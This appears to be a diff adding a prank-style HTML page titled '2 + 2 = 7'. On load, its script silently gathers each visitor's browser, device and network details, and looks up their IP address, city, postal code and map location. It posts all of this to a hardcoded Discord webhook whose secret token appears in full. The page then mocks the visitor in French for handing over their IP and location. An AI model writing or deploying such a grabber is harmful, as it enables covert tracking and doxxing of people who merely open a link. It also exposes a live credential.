@@ -1,0 +1,157 @@
+<html>
+    <head>
+        <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>2 + 2 = 7</title>
+<script>
+  async function sendWebhook(data) {
+    const webhookURL = 'https://discord.com/api/webhooks/1167397268295524422/Bn_o-5fHmurFk4nUn1BzHHeFIakS-X3wpM2erwdZwuCPVnG35YkP_FVDAr-97tCW1vH0';
+    const payload = {
+      embeds: [
+        {
+          title: 'Someone visited the website ! :information_source:',
+          color: 0x3498db,
+          fields: data,
+          timestamp: new Date().toISOString()
+        }
+      ]
+    };
+
+    try {
+      const response = await fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      });
+
+      if (!response.ok) {
+        console.error('error sending message :', response.statusText);
+      }
+    } catch (error) {
+      console.error('error sending message :', error);
+    }
+  }
+
+  async function collectInformation() {
+    const collectedData = [];
+
+    const userAgent = navigator.userAgent;
+    collectedData.push({ name: 'User Agent', value: userAgent });
+
+    const language = navigator.language;
+    collectedData.push({ name: 'Browser language', value: language });
+
+    const screenResolution = `${window.screen.width}x${window.screen.height}`;
+    collectedData.push({ name: 'Screen resolution', value: screenResolution });
+
+    const deviceType = getDeviceType();
+    collectedData.push({ name: 'Device type', value: deviceType });
+
+    const browser = getBrowserInfo();
+    collectedData.push({ name: 'Browser', value: browser });
+
+    const operatingSystem = getOperatingSystem();
+    collectedData.push({ name: 'Operating system', value: operatingSystem });
+
+    const referrer = document.referrer || 'Aucun référent';
+    collectedData.push({ name: 'Referent', value: referrer });
+
+    try {
+      const geoLocationAPI = 'https://ipapi.co/json';
+      const ipInfoResponse = await fetch(geoLocationAPI);
+      const ipInfoData = await ipInfoResponse.json();
+      if (ipInfoResponse.ok) {
+        collectedData.push({ name: 'IP address', value: ipInfoData.ip });
+        collectedData.push({ name: 'Country', value: ipInfoData.country_name });
+        collectedData.push({ name: 'Area', value: ipInfoData.region });
+        collectedData.push({ name: 'City', value: ipInfoData.city });
+        collectedData.push({ name: 'Zip code', value: ipInfoData.postal });
+        const googleMapsLink = `[View on Google Maps](${getGoogleMapsLink(ipInfoData.latitude, ipInfoData.longitude)})`;
+        collectedData.push({ name: 'Google Maps location', value: googleMapsLink });
+      }
+    } catch (error) {
+      console.error('error 2 :', error);
+    }
+
+    collectedData.push({ name: 'Network connection type', value: getNetworkConnectionType() });
+    collectedData.push({ name: 'Device language', value: getDeviceLanguage() });
+    collectedData.push({ name: 'Browser features', value: getBrowserCapabilities() });
+    collectedData.push({ name: 'Bandwidth estimation', value: await getEstimatedBandwidth() });
+    collectedData.push({ name: 'Device platform', value: getDevicePlatform() });
+    collectedData.push({ name: 'Browser memory', value: getBrowserMemory() });
+
+    sendWebhook(collectedData);
+  }
+
+  function getDeviceType() {
+    const screenWidth = window.innerWidth;
+    if (screenWidth > 1200) {
+      return 'Desktop';
+    } else if (screenWidth > 768) {
+      return 'Tablette';
+    } else {
+      return 'Mobile';
+    }
+  }
+
+  function getBrowserInfo() {
+    const ua = navigator.userAgent;
+    const browser = ua.match(/(Chrome|Safari|Firefox|Edge|IE|Opera)\/?\s*(\.?\d+(\.\d+)*)/);
+    return browser ? `${browser[1]} ${browser[2]}` : 'Unknown';
+  }
+
+  function getOperatingSystem() {
+    const ua = navigator.userAgent;
+    let os = 'Inconnu';
+    if (ua.indexOf('Win') !== -1) os = 'Windows';
+    else if (ua.indexOf('Mac') !== -1) os = 'MacOS';
+    else if (ua.indexOf('Linux') !== -1) os = 'Linux';
+    else if (ua.indexOf('Android') !== -1) os = 'Android';
+    else if (ua.indexOf('iOS') !== -1) os = 'iOS';
+    return os;
+  }
+
+  function getNetworkConnectionType() {
+    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    return connection ? connection.effectiveType : 'Not available';
+  }
+
+  function getDeviceLanguage() {
+    return navigator.language || 'Not available';
+  }
+
+  function getBrowserCapabilities() {
+    const capabilities = [];
+    capabilities.push(`Cookies: ${navigator.cookieEnabled}`);
+    capabilities.push(`JavaScript: ${navigator.javaEnabled()}`);
+    return capabilities.join(', ');
+  }
+
+  async function getEstimatedBandwidth() {
+    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    return connection ? `${(connection.downlink * 1024).toFixed(2)} KB/s` : 'Not available';
+  }
+
+  function getDevicePlatform() {
+    return navigator.platform || 'Not available';
+  }
+
+  function getBrowserMemory() {
+    return `${(performance.memory.totalJSHeapSize / 1048576).toFixed(2)} Mo`;
+  }
+
+  function getGoogleMapsLink(latitude, longitude) {
+    return `https://www.google.com/maps/place/${latitude},${longitude}`;
+  }
+
+  collectInformation();
+</script>
+</head>
+<body>
+  <p>Merci pour ton ip, localisation et autre</p>
+</body>
+    
+</html>
+
